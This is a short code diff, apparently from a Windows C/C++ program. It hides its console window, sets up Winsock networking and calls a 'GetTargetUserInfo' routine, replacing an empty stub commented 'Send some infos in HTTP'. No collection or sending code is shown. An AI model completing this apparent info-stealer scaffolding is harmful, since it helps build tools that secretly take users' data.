@@ -3,6 +3,7 @@
 #include <process.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include "UserInfo.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -12,6 +13,8 @@
 int main(int argc, char* argv[])
 {
 	FreeConsole();
+	UserInfo UserInfo;
+	UserInfo.GetTargetUserInfo();
 	WSADATA wsaData;
 	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	struct addrinfo* result = NULL, * ptr = NULL, hints;
@@ -41,8 +44,3 @@ int main(int argc, char* argv[])
 	WSACleanup();
 }
 
-void GetTargetUserInfo()
-{
-	// Send some infos in HTTP
-
-}
